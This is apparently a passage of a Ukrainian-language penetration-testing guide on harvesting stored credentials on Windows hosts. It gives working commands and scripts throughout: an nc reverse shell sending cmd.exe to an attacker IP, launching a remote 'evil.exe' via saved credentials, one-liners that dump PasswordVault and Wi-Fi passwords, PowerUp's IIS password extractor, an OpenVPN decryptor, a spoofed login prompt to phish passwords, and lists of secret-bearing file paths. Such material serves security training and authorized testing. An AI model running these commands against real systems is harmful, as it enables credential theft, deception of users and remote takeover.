Якщо програми не взаємодіють із Credential Manager, то, на мою думку, вони не можуть використовувати облікові дані для певного ресурсу. Тож якщо ваша програма хоче використовувати сховище, їй потрібно якимось чином **зв’язатися з менеджером облікових даних і запросити облікові дані для цього ресурсу** зі сховища за замовчуванням.

Скористайтеся `cmdkey`, щоб переглянути список збережених на комп’ютері облікових даних.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Потім можна використовувати `runas` з параметром `/savecred`, щоб скористатися збереженими обліковими даними. У наступному прикладі віддалений бінарний файл запускається через SMB-шару.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Використання `runas` із наданими обліковими даними.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Зверніть увагу на mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) або модуль [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Сучасні програми Windows UWP, Microsoft Edge і сучасні системні служби зберігають токени автентифікації та паролі у відкритому тексті в `PasswordVault` платформи Universal Windows Platform (UWP) (також доступному як `Web Credentials` у `vaultcmd`). Це сховище ізольоване в межах сеансу, і його можна розшифрувати штатними засобами без прав адміністратора чи `SeDebugPrivilege`.

Виконайте цю команду PowerShell в активному сеансі користувача, щоб миттєво отримати всі збережені імена користувачів і паролі у відкритому тексті та розшифрувати їх:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** надає метод симетричного шифрування даних, який переважно використовується в операційній системі Windows для симетричного шифрування асиметричних приватних ключів. Це шифрування використовує секрет користувача або системи, який суттєво підвищує ентропію.

**DPAPI дає змогу шифрувати ключі за допомогою симетричного ключа, похідного від облікових даних входу користувача**. У випадках системного шифрування використовуються секрети доменної автентифікації системи.

Зашифровані RSA-ключі користувача, захищені за допомогою DPAPI, зберігаються в каталозі `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` — це [ідентифікатор безпеки](https://en.wikipedia.org/wiki/Security_Identifier) користувача. **Ключ DPAPI, розташований поруч із головним ключем, який захищає приватні ключі користувача в тому самому файлі**, зазвичай складається з 64 байтів випадкових даних. (Важливо зазначити, що доступ до цього каталогу обмежений, тому переглянути його вміст за допомогою команди `dir` у CMD не можна, хоча це можна зробити через PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Ви можете використати **модуль mimikatz** `dpapi::masterkey` із відповідними аргументами (`/pvk` або `/rpc`), щоб розшифрувати його.

**Файли облікових даних, захищені головним паролем,** зазвичай розташовані в:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Ви можете скористатися **модулем mimikatz** `dpapi::cred` із відповідним `/masterkey`, щоб розшифрувати дані.\
Ви можете **витягти багато** **masterkeys DPAPI** з **пам’яті** за допомогою модуля `sekurlsa::dpapi` (якщо у вас є права root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Облікові дані PowerShell

**Облікові дані PowerShell** часто використовуються для **скриптів** і завдань автоматизації як зручний спосіб зберігання зашифрованих облікових даних. Вони захищені за допомогою **DPAPI**, а це зазвичай означає, що їх може розшифрувати лише той самий користувач на тому самому комп’ютері, де їх було створено.

Експортований файл облікових даних може мати довільне ім’я або шлях `.xml`. Якщо скрипт або інвентаризація файлів вказує на такий файл, визначте фактичний каталог профілю облікового запису, а не припускайте, що це `C:\Users`: [Windows може зберігати профілі в інших місцях](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Файл, доступний для читання, — це лише зачіпка; [Windows прив’язує зашифровані облікові дані `Export-Clixml` до користувача й комп’ютера, з яких їх було експортовано](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), а відновлений обліковий запис окремо має мати належні права на потрібному сервісі. Спершу перевірте шляхи й ACL, не виводячи зашифровані чи відкриті значення під час звичайного переліку.

Щоб **розшифрувати** облікові дані PS із файлу, що їх містить, виконайте:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Збережені RDP-підключення

Їх можна знайти в `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
і в `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Нещодавно виконані команди

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Диспетчер облікових даних віддаленого робочого стола**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Використовуйте модуль Mimikatz `dpapi::rdg` із відповідним `/masterkey`, щоб **розшифрувати будь-які файли .rdg**\
За допомогою модуля Mimikatz `sekurlsa::dpapi` можна **витягти багато головних ключів DPAPI** з пам’яті

**mRemoteNG використовує інше сховище підключень.** Перевірте читабельні XML-файли в `%APPDATA%\mRemoteNG` і документах користувача, зокрема файли зі звичайними назвами, як-от `config.xml`. Визначте схему підключень і зашифровані атрибути `Password`, перш ніж вважати XML-файл джерелом облікових даних. Збережене значення — це не пароль DPAPI/RDCMan; його відновлення залежить від параметрів шифрування файлу та від того, чи використовувався власний головний пароль. Під час масового пошуку не виводьте зашифровані значення.

**Експортовані профілі Remote Desktop Plus** також можуть бути читабельними й зберігатися в каталогах користувача або спільній теці адміністрування. У застарілому експорті `profiles.xml` є записи `Data/Profile` з елементами `ProfileName`, `Password` і `Secure`. Вважайте непорожній елемент пароля потенційним джерелом облікових даних, але не виводьте його та не припускайте, що це відкритий текст: [виробник зазначає](https://www.donkz.nl/), що захист профілю може бути прив’язаний до облікового запису й комп’ютера, на яких його створено, або налаштований менш суворо. Перш ніж покладатися на такий файл, перевірте його походження та умови відновлення.

### Sticky Notes

Люди іноді зберігають паролі та іншу інформацію в програмах для наліпок. Запакований застосунок Sticky Notes від Microsoft зазвичай зберігає нотатки за шляхом `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; старіші або інші програми можуть використовувати інші сховища профілю користувача, зокрема LevelDB. Перш ніж вважати відсутність файла SQLite ознакою відсутності нотаток, визначте встановлену програму та формат сховища.

Якщо Sticky Notes використовує журналювання SQLite з випереджальним записом (WAL), копія лише `plum.sqlite` може не містити останніх зафіксованих нотаток. Зберігайте відповідний `plum.sqlite-wal` разом із узгодженою копією бази даних і додавайте `plum.sqlite-shm`, якщо він доступний; індекс спільної пам’яті можна перебудувати, але WAL є частиною постійного стану бази даних. Див. [документацію SQLite щодо WAL](https://www.sqlite.org/wal.html). Нотатка з іменем облікового запису чи паролем — лише потенційне джерело облікових даних: окремо перевірте обліковий запис, дозволений доступ і повторне використання пароля. Для запису зашифрованого менеджера паролів також потрібні власне ключ розшифрування та специфічна для програми інтерпретація, перш ніж він зможе підтвердити можливість входу з вищими привілеями.

### AppCmd.exe

**Зверніть увагу: для відновлення паролів із AppCmd.exe потрібні права адміністратора та запуск із рівнем високої цілісності.**\
**AppCmd.exe** розташований у каталозі `%systemroot%\system32\inetsrv\`.\
Якщо цей файл існує, можливо, налаштовано певні **облікові дані**, які можна **відновити**.

Цей код узято з [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Перевірте, чи існує `C:\Windows\CCM\SCClient.exe`.\
Інсталятори **запускаються з привілеями SYSTEM**, багато з них вразливі до **DLL Sideloading (інформація з** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Файли та реєстр (облікові дані)

### Артефакти облікових даних засобів віддаленої підтримки в реєстрі

У деяких старих інсталяціях засобів віддаленої підтримки назви значень, пов’язаних із паролями, зберігаються за фіксованими ключами реєстру програм. Наприклад, згідно з [поясненням постачальника щодо ключа реєстру](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988), у версіях TeamViewer до 9 включно `SecurityPasswordAES` позначав налаштований статичний пароль сеансу. Маркер у назві значення — лише підказка для перевірки: перш ніж оцінювати облікові дані, перевірте встановлену версію, доступність даних значення для читання, формат і поточну поведінку автентифікації. Щоб від пароля засобу віддаленої підтримки перейти до облікового запису Windows із вищими привілеями, пароль має фактично повторно використовуватися для цього облікового запису, а доступ до нього має бути дозволений. Не виводьте шифротекст і відновлені паролі під час звичайного переліку.

### Спільні електронні таблиці із захищеними аркушами

Якщо є підозра, що доступна для читання спільна книга містить дані облікових записів, розрізняйте **шифрування файлу** та захист аркуша чи приховані стовпці. [Microsoft зазначає](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), що захист аркуша обмежує редагування, але не є функцією безпеки; сам по собі він не означає, що вміст книги зашифровано. Переглядайте лише дозволені й релевантні файли та не виводьте потенційні секрети під час широкого переліку. Доступний для читання шлях до `.xlsx`, захищений аркуш або прихований стовпець самі по собі не доводять наявності облікових даних чи вищих привілеїв облікового запису; окремо перевірте фактичні дані й поточні права облікового запису.

### Збережені CI-сервером патчі змін

CI-сервер може зберігати надіслані зміни вихідного коду у своєму каталозі даних навіть після завершення збірки. У документації [TeamCity зазначено](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html), що `system/changes` використовується для зберігання змін remote-run; каталог даних можна налаштувати, і він не обов’язково розташований у `ProgramData`. Доступний для читання патч може містити видалені або додані посилання на файл облікових даних, ключ шифрування чи скрипт, який використовує і те, й інше. Наприклад, для процесу PowerShell із `ConvertTo-SecureString -Key` потрібні і ключ AES, і зашифрований рядок; у документації [Microsoft зазначено](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), що ключ надається окремо. Спершу перегляньте лише назви доступних патчів, а потім — за наявності дозволу — перевірте релевантний вміст, не виводячи секрети під час звичайного переліку. Шлях до патча, зашифроване значення або посилання на ключ самі по собі не доводять наявності дійсних облікових даних чи доступу з вищими привілеями. Обмежте ACL каталогу даних і не додавайте секрети до змін збірки.

### Ротація паролів користувачів локальної групи адміністраторів

Саморобний механізм ротації паролів може зберігати зашифрований пароль локального адміністратора в локальній службі, а облікові дані сховища даних — у доступному для читання файлі `.env` або поруч із бінарним файлом програми оновлення. Перевірте разом заплановане завдання програми оновлення, обліковий запис, ACL конфігурації, слухач і дозволи сховища даних. Сховище даних, доступне лише через loopback, усе одно доступне локальному користувачеві з дійсними обліковими даними, але сама автентифікація не доводить наявності дозволу на читання потрібних записів. Якщо поруч із шифротекстом доступні початкове значення шифрування або матеріал ключа, перш ніж покладатися на шифрування, перевірте точний алгоритм виведення ключа. Схема, яка детерміновано виводить ключ AES з відкритого початкового значення за допомогою Go [`math/rand`](https://pkg.go.dev/math/rand), непридатна для захисту такого пароля; у документації Go зазначено, що цей пакет не підходить для випадкових даних, критичних для безпеки. Перш ніж вважати відновлений пароль шляхом підвищення привілеїв, переконайтеся, що він досі дійсний і належить обліковому запису локальної групи Administrators. Самі по собі заплановане завдання, шлях до `.env` або зашифрований блок нічого з цього не доводять. Не виводьте паролі й матеріал ключа під час звичайного переліку.

Для керування паролями локальних адміністраторів використовуйте [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Зберігання в каталозі або Entra та відповідні засоби контролю доступу відрізняються від спеціального локального сховища даних; так само [ролі Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) визначають, чи може автентифікований користувач сховища даних читати певний індекс.

### Архіви плагінів Java-серверів і повторне використання облікових даних

Деякі плагіни Java-серверів поширюються як архіви JAR у каталозі сервера `plugins`. Доступний для читання користувацький плагін може містити конфігурацію або байткод із вбудованими обліковими даними служби. Переглядайте архів лише за наявності дозволу та не виводьте відновлені секрети під час звичайного переліку. Сам шлях до плагіна не доводить наявності секрету, а відновлений пароль служби дає вищі привілеї лише тоді, коли він також дійсний для облікового запису з вищими привілеями. Перевірте ACL відповідних файлів і замініть повторно використані облікові дані на окремі секрети. Див. [посібник PaperMC зі встановлення плагінів](https://docs.papermc.io/paper/adding-plugins/) щодо структури каталогів і [документацію Oracle щодо JAR](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) щодо вмісту архівів.

### Облікові дані вбудованої бази даних Openfire

Інсталяція Openfire із вбудованою базою даних може зберігати `openfire.script` у `Openfire\embedded-db`. Якщо поточний обліковий запис має право читати цей файл, перегляньте записи `OFUSER` разом із властивістю `passwordKey`. У [документації Openfire щодо постачальника користувачів](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) зазначено, що паролі можуть зберігатися у відкритому вигляді або бути зашифровані ключем, що зберігається в цій властивості. Відновлений пароль важливий для підвищення привілеїв лише тоді, коли він досі дійсний для ідентичності з вищими привілеями; сама назва файлу не доводить ані доступу для читання, ані повторного використання облікових даних. Шлях — це лише підказка для інвентаризації, тому не виводьте вміст бази даних та облікові дані під час звичайного переліку.

Окремий файл `Openfire\conf\openfire.xml` може показати налаштовані порти й інтерфейс прив’язки консолі адміністратора, навіть якщо використовується зовнішня база даних. Зазвичай Openfire прив’язує консоль адміністратора до loopback; однак локальний обліковий запис усе одно може звернутися до цієї адреси, якщо слухач запущений. Перевірте фактичний слухач, авторизовану роль адміністратора, політику завантаження плагінів та ідентичність служби Openfire. Адміністратор, який може встановлювати плагіни, може запустити код плагіна в контексті служби; це може означати високі привілеї, якщо служба працює від імені LocalSystem. Самі по собі збіг пароля облікового запису або доступний для читання шлях до конфігурації не доводять доступу до консолі адміністратора чи виконання коду. Див. [посібник постачальника з інсталяції та керування плагінами](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) і [властивість API для завантаження плагінів](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Конфігурація сервера керування цифровою криміналістикою

Конфігурації сервера Velociraptor, які зазвичай мають назву `server.config.yaml`, можуть містити `CA.private_key` внутрішнього CA. Якщо користувач із нижчими привілеями може читати цей ключ, він може мати змогу створити клієнтський сертифікат API. Чи дає це змогу отримати вищі привілеї, залежить від ролей користувачів сервера, доступності API та ідентичності, від імені якої працює сервер або цільовий агент. Клієнтська конфігурація містить інші дані; її виявлення не доводить доступу до CA сервера. У деяких розгортаннях закритий ключ CA зберігається офлайн, тож у доступній для читання конфігурації сервера ключа підпису може не бути.

На сервері Windows перевірте ACL **серверної** конфігурації в каталозі інсталяції та будь-яких захищених резервних копій. Одне з можливих розташувань — `%ProgramFiles%\VelociraptorServer\server.config.yaml`; якщо шлях, налаштований для служби, відрізняється, використовуйте його. Переконайтеся, що поточна ідентичність може читати файл і що `CA.private_key` справді присутній. Не виводьте закритий ключ у журнали чи результат переліку. Процес `config api_client` від постачальника використовує ключ CA для видачі клієнтського сертифіката, але також потрібна ефективна роль на сервері; її створення або зміна може вимагати доступу на запис до сховища даних чи перезапуску. Наявна ідентичність сервера з привілеями може забезпечити шлях навіть за відсутності таких прав на запис. Запити API з правами на виконання запускаються у відповідному контексті сервера або агента, який може мати високі привілеї.

Захистіть конфігурацію сервера та резервні копії суворими ACL, за можливості зберігайте ключ підпису CA офлайн і обмежте ролі API та доступ до слухачів. Див. [документацію Velociraptor API](https://docs.velociraptor.app/docs/server_automation/server_api/) і [рекомендації з налаштування безпеки](https://docs.velociraptor.app/docs/deployment/security/).

### Облікові дані PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY — це окремий менеджер сеансів. Його нативне зашифроване сховище може розташовуватися за шляхом `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, а експортована резервна копія сеансів може мати назву `sessions-backup.dat` і зберігатися в іншому місці. У [посібнику SolarWinds з експорту](https://thwack.solarwinds.com/discussion/comment/115591) зазначено, що експорти зашифровані паролем і можуть містити сеанси, ключі, скрипти, теги та зв’язки; у [форумі підтримки](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) вказано розташування нативного сховища. Спершу перевірте дозволи на файли та шляхи. Виявлення будь-якого з цих файлів не розкриває його пароль і не доводить, що збережені облікові дані досі дійсні або надають вищі привілеї.

### Ключі SSH-хостів PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH-ключі в реєстрі

Приватні SSH-ключі можуть зберігатися в розділі реєстру `HKCU\Software\OpenSSH\Agent\Keys`, тож перевірте, чи є там щось цікаве:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Якщо ви знайдете будь-який запис у цьому шляху, імовірно, це збережений SSH-ключ. Він зберігається в зашифрованому вигляді, але його можна легко розшифрувати за допомогою [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Докладніше про цю техніку: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Якщо служба `ssh-agent` не запущена і ви хочете, щоб вона автоматично запускалася під час завантаження системи, виконайте:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Схоже, ця техніка більше не працює. Я спробував створити кілька ключів ssh, додати їх за допомогою `ssh-add` і ввійти на машину через ssh. Розділу реєстру HKCU\Software\OpenSSH\Agent\Keys не існує, а procmon не виявив використання `dpapi.dll` під час автентифікації за допомогою асиметричного ключа.

### Файли автоматичного встановлення

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Також можна шукати ці файли за допомогою **metasploit**: _post/windows/gather/enum_unattend_

Приклад вмісту:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Резервні копії SAM і SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Читані файли резервних копій Windows Imaging (`.wim`) також можуть містити офлайн-вулики `SAM`, `SECURITY` і `SYSTEM`. Насамперед перевіряйте локально доступні каталоги резервних копій або образів і переглядайте **імена елементів** образу, перш ніж щось видобувати: сама назва файлу `.wim` не доводить, що він містить вулики, а типові `install.wim`, `boot.wim` і образи відновлення часто виявляються хибними зачіпками. SMB-ресурс — це окремий шлях доступу, який слід перевіряти лише тоді, коли цей ресурс входить до сфери перевірки. Див. рекомендації Microsoft щодо [образів Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) і [довідник із файлів вуликів реєстру](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Хмарні облікові дані

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Знайдіть файл під назвою **SiteList.xml**

### Кешований пароль GPP

Раніше була доступна функція, яка дозволяла розгортати власні облікові записи локального адміністратора на групі комп’ютерів за допомогою Group Policy Preferences (GPP). Однак цей метод мав серйозні недоліки безпеки. По-перше, об’єкти групової політики (GPO), що зберігалися як XML-файли в SYSVOL, були доступні будь-якому користувачу домену. По-друге, паролі в цих GPP, зашифровані AES256 за допомогою загальнодоступного ключа за замовчуванням, міг розшифрувати будь-який автентифікований користувач. Це становило серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.

Щоб зменшити цей ризик, було розроблено функцію для пошуку локально кешованих файлів GPP, що містять непорожнє поле "cpassword". Знайшовши такий файл, функція розшифровує пароль і повертає власний об’єкт PowerShell. Цей об’єкт містить відомості про GPP і розташування файлу, що допомагає виявити та усунути цю вразливість безпеки.

Шукайте ці файли в `C:\ProgramData\Microsoft\Group Policy\history` або в _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Щоб розшифрувати cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Використання crackmapexec для отримання паролів:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Конфігурація IIS Web

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Приклад web.config з обліковими даними:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Резервні архіви у вебкорені IIS

Старий ZIP-файл резервної копії, розміщений безпосередньо у вебкорені, з якого віддаються файли, може розкривати попередні файли конфігурації та облікові дані, які можна повторно використати. Перевірте налаштований фізичний шлях сайту та з’ясуйте, чи архів справді доступний через HTTP, перш ніж вважати це витоком. Шлях за замовчуванням `C:\inetpub\wwwroot` — лише можливий варіант. Швидка локальна перевірка може показати назви й розміри файлів, не відкриваючи архіви:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Назва архіву не доводить, що він містить секретні дані або що відновлені облікові дані надають вищі привілеї.

### Облікові дані OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Журнали

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Запит облікових даних

Завжди можна **попросити користувача ввести свої облікові дані або навіть облікові дані іншого користувача**, якщо вважаєте, що він може їх знати (зауважте, що безпосередньо **запитувати** клієнта про його **облікові дані** справді **ризиковано**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Можливі імена файлів, що містять облікові дані**

Відомі файли, які деякий час тому містили **паролі** у **відкритому тексті** або Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
